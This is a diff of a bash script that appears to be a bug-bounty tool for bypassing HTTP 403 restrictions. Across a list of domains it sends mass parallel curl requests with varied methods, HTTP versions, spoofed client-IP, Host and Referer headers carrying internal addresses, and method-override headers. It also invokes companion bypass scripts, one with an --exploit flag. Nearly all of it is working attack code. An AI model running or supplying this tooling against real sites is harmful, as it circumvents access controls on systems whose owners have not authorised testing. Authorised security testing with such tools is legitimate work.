@@ -1,6 +1,6 @@
 #!/bin/bash
-#usgae: ./domain-403.sh domains_without_prefix.txt
-#output: bypassed_output_domains.txt
+# Usage: ./domain-403.sh domains_without_prefix.txt
+# Output: domain-bypass-out
 
 INPUT="$1"
 OUTPUT="domain-bypass-out"
@@ -26,8 +26,6 @@ HEADERS=(
 "True-Client-IP"
 "Cluster-Client-IP"
 "Host"
-"X-Original-URL"
-"X-ProxyUser-Ip"
 "Referer"
 )
 
@@ -40,16 +38,48 @@ VALUES=(
 "10.0.0.1"
 "172.16.0.0"
 )
- UA="Mozilla/5.0"
- GOOD_CODES="200 201 202 204 205 206 207 208 301 302 307 308"
+
+UA="Mozilla/5.0"
+GOOD_CODES="200 201 202 204 205 206 207 208"
 
 if [[ ! -f "$INPUT" ]]; then
     echo "[-] Input file not found."
     exit 1
 fi
 
-# Phase1
-echo -e "\n[*] Phase 1: DIFFERENT( METHODS + VERSIONS +HEADERS )"
+echo -e "\n[*] Phase 1: METHODS + HEADERS + IP VALUES + HTTP VERSIONS"
+
+make_request() {
+    local url="$1"
+    local method="$2"
+    local version="$3"
+    local header="$4"
+    local value="$5"
+    local proto="$6"
+
+    UA="Mozilla/5.0"
+    GOOD_CODES="200 201 202 204 205 206 207 208"
+    version_name="${version/--/}"
+
+    [[ "$method" =~ ^(POST|PUT|PATCH)$ ]] && data="--data dummy=1" || data=""
+
+    code=$(curl -sk --connect-timeout 10 --max-time 10 \
+        $version \
+        -X "$method" \
+        -A "$UA" \
+        -H "$header: $value" \
+        -o /dev/null \
+        -w "%{http_code}" \
+        $data \
+        "$url")
+
+    echo "$method + $version_name + $proto + $header: $value => $code"
+
+    if echo "$GOOD_CODES" | grep -qw "$code"; then
+        echo "[+] $method + $version_name + $proto + $header: $value => $code @ $url" >> "$OUTPUT"
+    fi
+}
+export -f make_request
 
 while IFS= read -r domain || [[ -n "$domain" ]]; do
     [[ -z "$domain" ]] && continue
@@ -66,31 +96,7 @@ while IFS= read -r domain || [[ -n "$domain" ]]; do
 
         for method in "${METHODS[@]}"; do
             for version in "${versions[@]}"; do
-                version_name="${version/--/}"
-
-                [[ "$method" =~ ^(POST|PUT|PATCH)$ ]] && data="--data dummy=1" || data=""
-
-                for header in "${HEADERS[@]}"; do
-                    for value in "${VALUES[@]}"; do
-
-                        code=$(curl -sk --connect-timeout 10 --max-time 10 \
-                            $version \
-                            -X "$method" \
-                            -A "$UA" \
-                            -H "$header: $value" \
-                            -o /dev/null \
-                            -w "%{http_code}" \
-                            $data \
-                            "$url")
-
-                        echo "$method + $version_name + $proto + $header: $value => $code"
-
-                        if echo "$GOOD_CODES" | grep -qw "$code"; then
-                            echo "[+] $method + $version_name + $proto + $header: $value => $code @ $url" >> "$OUTPUT"
-                        fi
-
-                    done
-                done
+                parallel -j 50 make_request ::: "$url" ::: "$method" ::: "$version" ::: "${HEADERS[@]}" ::: "${VALUES[@]}" ::: "$proto"
             done
         done
     done
@@ -110,6 +116,9 @@ OVERRIDE_HEADERS=(
 "X-Method-Override: DELETE"
 "X-Original-Method: PUT"
 )
+
+GOOD_CODES="200 201 202 204 205 206 207 208 301 302 207 308"
+
 
 while IFS= read -r domain || [[ -n "$domain" ]]; do
     [[ -z "$domain" ]] && continue
@@ -288,7 +297,7 @@ while IFS= read -r domain || [[ -n "$domain" ]]; do
     /home/maddy/techiee/bug_bounty/403_bypass/403_bypasser.sh "$domain" / | tee "403_temp_log"
 
     # Filter useful output and append to main output file
-    grep -Ei '\b(200|201|202|203|204|205|206|207|208|209|301|302|500|501|502|307|308)\b' 403_temp_log >> "$OUTPUT"
+    grep -Ei '\b(200|201|202|203|204|205|206|207|208|209|301|302)\b' 403_temp_log >> "$OUTPUT"
 
 done < "$INPUT"
 echo -e "\n-----------END 403_BYPASS.SH: $domain---------------" >> "$OUTPUT"
@@ -308,7 +317,7 @@ while IFS= read -r domain || [[ -n "$domain" ]]; do
     /home/maddy/techiee/bug_bounty/403_bypass/403-bypasser2.sh -u "$domain" --exploit | tee "403_temp_log"
 
     # Filter useful output and append to main output file
-    grep -Ei '\b(200|201|202|203|204|205|206|207|208|209|301|302|500|501|502|307|308)\b' 403_temp_log >> "$OUTPUT"
+    grep -Ei '\b(200|201|202|203|204|205|206|207|208|209|301|302)\b' 403_temp_log >> "$OUTPUT"
 
 done < "$INPUT"
 echo -e "\n-----------END 403_BYPASS.SH: $domain---------------" >> "$OUTPUT"
